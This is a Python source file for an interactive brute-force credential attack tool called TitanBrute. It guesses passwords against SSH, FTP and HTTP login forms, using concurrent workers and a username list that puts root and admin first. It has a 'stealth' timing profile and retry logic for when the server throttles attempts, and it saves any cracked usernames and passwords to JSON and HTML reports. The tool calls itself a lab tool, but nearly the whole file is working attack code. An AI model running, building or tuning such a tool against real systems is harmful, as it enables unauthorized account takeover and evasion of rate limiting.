#!/usr/bin/env python3
"""
================================================================================
TITANBRUTE AUTOMATION ENGINE v4.2 - CYBER ACADEMY PERFORMANCE EDITION
================================================================================
Architectural Pillars:
1. Asynchronous I/O Multiplexing via asyncio.
2. High-Throughput Semaphore Tuning for Laboratory Environments.
3. Adaptive Fast-Track Error Handling Layer.
================================================================================
"""

import sys
import os
import json
import time
import random
import asyncio
import argparse
import warnings
from datetime import datetime
from pathlib import Path

warnings.filterwarnings("ignore", category=DeprecationWarning)

if sys.platform.startswith('win'):
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.prompt import Prompt, Confirm
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, MofNCompleteColumn, TimeElapsedColumn
    from rich import box
except ImportError:
    print("[!] Runtime Failure: Dependencies missing. Run: pip install rich")
    sys.exit(1)

try:
    from modules.ssh import SSHModule
    from modules.ftp import FTPModule
    from modules.http_login import HTTPLoginModule
except ImportError:
    sys.path.append(str(Path(__file__).parent))
    from modules.ssh import SSHModule
    from modules.ftp import FTPModule
    from modules.http_login import HTTPLoginModule

console = Console()
__version__ = "4.2"

PRIORITY_USERS = ['root', 'admin', 'eagle', 'ubuntu', 'administrator', 'kali']

def display_banner():
    banner = (
        "[bold cyan]████████╗██╗████████╗█████╗ ███╗   ██╗██████╗ ██████╗ ██╗   ██╗████████╗███████╗[/bold cyan]\n"
        "[bold cyan]╚══██╔══╝██║╚══██╔══╝██╔══██╗████╗  ██║██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝[/bold cyan]\n"
        "[bold blue]   ██║   ██║   ██║   ███████║██╔██╗ ██║██████╔╝██████╔╝██║   ██║   ██║   █████╗  [/bold blue]\n"
        "[bold blue]   ██║   ██║   ██║   ██╔══██║██║╚██╗██║██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  [/bold blue]\n"
        "[bold blue]   ██║   ██║   ██║   ██║  ██║██║ ╚████║██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗[/bold blue]\n"
        "[╚══╝   ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝]"
    )
    console.print(Panel(
        banner,
        title=f"[bold white]TITANBRUTE AUTOMATION ENGINE v{__version__}[/bold white]",
        subtitle="[bold red]⚡ HIGH-SPEED PERFORMANCE EDITION[/bold red]",
        border_style="bold cyan", 
        box=box.DOUBLE, 
        padding=(1, 2)
    ))

class OptimizationEngine:
    def __init__(self, target: str, port: int, protocol: str, timeout: float, profile: str, exit_on_hit: bool, extra_config: dict = None):
        self.target = target
        self.port = port
        self.protocol = protocol.lower()
        self.timeout = timeout
        self.exit_on_hit = exit_on_hit
        self.extra_config = extra_config or {}
        self.found_credentials = []
        self.stats = {"attempts": 0, "failures": 0, "throttled": 0, "start_time": 0.0}
        self.profile = profile
        
        # Maximize concurrency configuration metrics across target environments
        if profile == "stealth":
            self.max_concurrency = 2
            self.base_delay = 0.5
            self.jitter_range = (0.2, 0.6)
            self.throttle_penalty = 1.5
        elif profile == "fast":
            self.max_concurrency = 16  # Cranked up concurrency limit for local sandboxes
            self.base_delay = 0.001    # Drastically reduced waiting delays
            self.jitter_range = (0.001, 0.005)
            self.throttle_penalty = 0.05  # Dropped from 1.0s down to a micro-delay fallback
        else:  # Balanced
            self.max_concurrency = 6
            self.base_delay = 0.08
            self.jitter_range = (0.02, 0.08)
            self.throttle_penalty = 0.5

        self.semaphore = asyncio.Semaphore(self.max_concurrency)
        self.abort_event = asyncio.Event()

        if self.protocol == "ssh":
            self.module_cls = SSHModule
        elif self.protocol == "ftp":
            self.module_cls = FTPModule
        elif self.protocol == "http":
            self.module_cls = HTTPLoginModule
        else:
            raise ValueError(f"Unsupported validation module protocol choice: {protocol}")

    def process_wordlists(self, user_file: str, pass_file: str) -> list:
        if not os.path.exists(user_file) or not os.path.exists(pass_file):
            return []
        with open(user_file, 'r', encoding='utf-8', errors='ignore') as f:
            users = list(dict.fromkeys([line.strip() for line in f if line.strip()]))
        with open(pass_file, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = list(dict.fromkeys([line.strip() for line in f if line.strip()]))
        
        users.sort(key=lambda u: (0, u) if u.lower() in PRIORITY_USERS else (1, u))
        return [(u, p) for u in users for p in passwords]

    async def _worker_loop(self, queue: asyncio.Queue, progress, task_id, module):
        while not queue.empty() and not self.abort_event.is_set():
            try:
                username, password = queue.get_nowait()
            except asyncio.QueueEmpty:
                break

            if self.base_delay > 0:
                await asyncio.sleep(self.base_delay + random.uniform(*self.jitter_range))
            
            status = "THROTTLED"
            retries = 3
            
            while retries > 0 and status == "THROTTLED" and not self.abort_event.is_set():
                async with self.semaphore:
                    self.stats["attempts"] += 1
                    res = await module.authenticate(username, password)
                    
                    if res is True or res == "SUCCESS":
                        status = "SUCCESS"
                    elif res is False or res == "FAILURE":
                        status = "FAILURE"
                    else:
                        status = "THROTTLED"
                
                if status == "SUCCESS":
                    self.found_credentials.append({
                        "user": username, 
                        "pass": password, 
                        "timestamp": datetime.now().isoformat()
                    })
                    progress.console.print(f"[bold green][🏆 HIT] Valid Signature Match Found: {username} / {password}[/bold green]")
                    if self.exit_on_hit:
                        self.abort_event.set()
                    progress.update(task_id, advance=1)
                    queue.task_done()
                    break
                elif status == "FAILURE":
                    self.stats["failures"] += 1
                    progress.update(task_id, advance=1)
                    queue.task_done()
                    break
                elif status == "THROTTLED":
                    self.stats["throttled"] += 1
                    retries -= 1
                    # Optimized micro-penalty logic for ultra-fast fallback verification
                    await asyncio.sleep((4 - retries) * self.throttle_penalty + random.uniform(0.01, 0.03))
            
            if status == "THROTTLED" and retries == 0:
                await queue.put((username, password))
                queue.task_done()

    async def execute(self, matrix: list):
        self.stats["start_time"] = time.time()
        queue = asyncio.Queue()
        for pair in matrix:
            queue.put_nowait(pair)
            
        module = self.module_cls(self.target, self.port, self.timeout, self.extra_config)
        total_tasks = len(matrix)

        with Progress(
            SpinnerColumn(),
            TextColumn("[bold cyan][{task.description}][/bold cyan]"),
            BarColumn(bar_width=40, complete_style="cyan", finished_style="green"),
            MofNCompleteColumn(),
            TextColumn("[cyan]•[/cyan] Time:"),
            TimeElapsedColumn(),
            console=console
        ) as progress:
            
            task_id = progress.add_task(f"Auditing Matrix ({self.protocol.upper()})", total=total_tasks)
            workers = [asyncio.create_task(self._worker_loop(queue, progress, task_id, module)) 
                       for _ in range(self.max_concurrency)]
            
            await asyncio.gather(*workers)

    def generate_reports(self, output_base: str):
        end_time = time.time()
        duration = end_time - self.stats["start_time"]
        
        # Target folder isolation configuration layout path
        reports_dir = Path("reports")
        reports_dir.mkdir(exist_ok=True)
        
        json_filepath = reports_dir / f"{output_base}.json"
        html_filepath = reports_dir / f"{output_base}.html"
        
        report_data = {
            "meta": {
                "version": __version__,
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "target": f"{self.target}:{self.port}",
                "protocol": self.protocol.upper(),
                "duration_sec": round(duration, 2),
                "metrics": self.stats
            },
            "findings": self.found_credentials
        }

        with open(json_filepath, 'w', encoding='utf-8') as jf:
            json.dump(report_data, jf, indent=4)
            
        html_content = f"""<!DOCTYPE html><html><head><title>TitanBrute Report</title>
        <style>
            body {{ font-family: sans-serif; margin: 40px; background: #f8fafc; color: #1e293b; }}
            .card {{ background: #ffffff; padding: 25px; border-radius: 8px; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1); max-width: 800px; margin: 0 auto; }}
            h1 {{ color: #0f172a; border-bottom: 2px solid #e2e8f0; padding-bottom: 10px; }}
            table {{ width: 100%; border-collapse: collapse; margin-top: 15px; }}
            th, td {{ padding: 10px; text-align: left; border-bottom: 1px solid #e2e8f0; }}
            th {{ background: #f1f5f9; }}
            .hit {{ color: #15803d; font-weight: bold; }}
        </style></head><body><div class="card">
        <h1>TitanBrute Audit Summary Report</h1>
        <p><strong>Target Endpoint Vector:</strong> {report_data['meta']['target']}</p>
        <p><strong>Service Protocol:</strong> {report_data['meta']['protocol']}</p>
        <p><strong>Total Duration Bounds:</strong> {report_data['meta']['duration_sec']} seconds</p>
        <h3>Authentication Findings Output Matrix:</h3>
        <table><tr><th>Username File Entry</th><th>Password Value Found</th><th>Time Context</th></tr>"""
        for c in self.found_credentials:
            html_content += f"<tr><td>{c['user']}</td><td><code>{c['pass']}</code></td><td class='hit'>{c['timestamp']}</td></tr>"
        if not self.found_credentials:
            html_content += "<tr><td colspan='3' style='text-align:center;'>No valid authentication accounts identified inside space bounds.</td></tr>"
        html_content += "</table></div></body></html>"
        
        with open(html_filepath, 'w', encoding='utf-8') as hf:
            hf.write(html_content)

def main():
    display_banner()
    
    console.print("\n[bold yellow]✨ Entering Interactive Laboratory Configuration Panel[/bold yellow]\n")
    target = Prompt.ask("[bold white]🎯 Target Host IP/Hostname[/bold white]", default="192.168.0.35")
    protocol = Prompt.ask("[bold white]🌐 Protocol Target Selection[/bold white]", choices=["ssh", "ftp", "http"], default="ssh")
    
    if protocol == "ssh": default_port = "22"
    elif protocol == "ftp": default_port = "21"
    else: default_port = "80"
        
    port = int(Prompt.ask("[bold white]🔌 Port Map Endpoint[/bold white]", default=default_port))
    
    extra_config = {}
    if protocol == "http":
        extra_config['uri'] = Prompt.ask("[bold white]📄 Relative Login Page URI path[/bold white]", default="/login.php")
        extra_config['user_param'] = Prompt.ask("[bold white]📦 Username form parameter element name[/bold white]", default="username")
        extra_config['pass_param'] = Prompt.ask("[bold white]📦 Password form parameter element name[/bold white]", default="password")
        extra_config['error_signature'] = Prompt.ask("[bold white]⚠️ Error signature verification failure message match string[/bold white]", default="Invalid credentials")
        
        if port == 443:
            extra_config['use_ssl'] = True
        else:
            use_ssl_prompt = Prompt.ask("[bold white]🔒 Enable HTTPS (SSL/TLS layer)? [y/n][/bold white]", choices=["y", "n"], default="n")
            extra_config['use_ssl'] = True if use_ssl_prompt == "y" else False

    # New Targeted Mode Selector Feature Execution Logic
    console.print("\n[bold cyan]🎯 Select Evaluation Strategy Mode:[/bold cyan]")
    console.print("  [1] [white]Full Matrix Sweep[/white] (User List x Password List)")
    console.print("  [2] [white]Targeted Password Only[/white] (Known Username x Password List)")
    console.print("  [3] [white]Targeted User Only[/white] (User List x Known Password)")
    mode = Prompt.ask("[bold white]⚙️ Mode Choice Selection[/bold white]", choices=["1", "2", "3"], default="1")

    matrix = []
    engine = OptimizationEngine(target, port, protocol, timeout=5.0, profile="balanced", exit_on_hit=True)

    if mode == "1":
        user_file = Prompt.ask("[bold white]📂 User Wordlist Workspace Path[/bold white]", default="users.txt")
        pass_file = Prompt.ask("[bold white]📂 Pass Wordlist Workspace Path[/bold white]", default="passwords.txt")
        profile = Prompt.ask("[bold white]⚙️ Tuning Concurrency Profile Selector[/bold white]", choices=["stealth", "balanced", "fast"], default="balanced")
        exit_fast = Confirm.ask("[bold white]🛑 Conclude task queue upon finding first structural login hit?[/bold white]", default=True)
        
        engine.profile = profile
        engine.exit_on_hit = exit_fast
        # Re-trigger internal dynamic parameter optimization settings logic
        engine.__init__(target, port, protocol, timeout=5.0, profile=profile, exit_on_hit=exit_fast, extra_config=extra_config)
        matrix = engine.process_wordlists(user_file, pass_file)

    elif mode == "2":
        known_user = Prompt.ask("[bold white]👤 Known Target Username[/bold white]")
        pass_file = Prompt.ask("[bold white]📂 Pass Wordlist Workspace Path[/bold white]", default="passwords.txt")
        profile = Prompt.ask("[bold white]⚙️ Tuning Concurrency Profile Selector[/bold white]", choices=["stealth", "balanced", "fast"], default="fast")
        
        engine.__init__(target, port, protocol, timeout=5.0, profile=profile, exit_on_hit=True, extra_config=extra_config)
        if os.path.exists(pass_file):
            with open(pass_file, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = list(dict.fromkeys([line.strip() for line in f if line.strip()]))
            matrix = [(known_user, p) for p in passwords]

    elif mode == "3":
        user_file = Prompt.ask("[bold white]📂 User Wordlist Workspace Path[/bold white]", default="users.txt")
        known_pass = Prompt.ask("[bold white]🔑 Known Valid Password[/bold white]")
        profile = Prompt.ask("[bold white]⚙️ Tuning Concurrency Profile Selector[/bold white]", choices=["stealth", "balanced", "fast"], default="fast")
        
        engine.__init__(target, port, protocol, timeout=5.0, profile=profile, exit_on_hit=False, extra_config=extra_config)
        if os.path.exists(user_file):
            with open(user_file, 'r', encoding='utf-8', errors='ignore') as f:
                users = list(dict.fromkeys([line.strip() for line in f if line.strip()]))
            matrix = [(u, known_pass) for u in users]

    if not matrix:
        console.print("[bold red][!] Workspace Matrix Empty. Confirm files exist and contain real data.[/bold red]")
        sys.exit(1)

    console.print(Panel(
        f"[white]Target Focus Vector   :[/white] [cyan]{target}:{port}[/cyan] ({protocol.upper()})\n"
        f"[white]Permutation Envelope   :[/white] [yellow]{len(matrix)} credential vectors initialized[/yellow]\n"
        f"[white]Active Concurrency Limit:[/white] [magenta]{engine.max_concurrency} synchronous worker loops[/magenta]\n"
        f"[white]Profile Throttling Mode:[/white] [bold cyan]{engine.profile.upper()}[/bold cyan]",
        title="Pre-Flight Validation Manifest Configuration", border_style="bold blue", box=box.ROUNDED
    ))

    try:
        asyncio.run(engine.execute(matrix))
    except KeyboardInterrupt:
        console.print("\n[bold red][!] Local engine user abort signal trapped via SIGINT. Safely exiting...[/bold red]")
    finally:
        output_name = f"titanbrute_audit_{int(time.time())}"
        engine.generate_reports(output_name)
        
        console.print(Panel(
            f"[bold green]📊 Laboratory Execution Sweep Complete[/bold green]\n\n"
            f"[white]Total Evaluation Tries :[/white] {engine.stats['attempts']}\n"
            f"[white]Rate Limits Resolved    :[/white] {engine.stats['throttled']}\n"
            f"[white]Identified Accounts   :[/white] [bold green]{len(engine.found_credentials)}[/bold green]\n\n"
            f"[white]Compliance Report Logs :[/white] [cyan]reports/{output_name}.html / .json[/cyan]",
            border_style="green", box=box.DOUBLE
        ))

if __name__ == "__main__":
    main()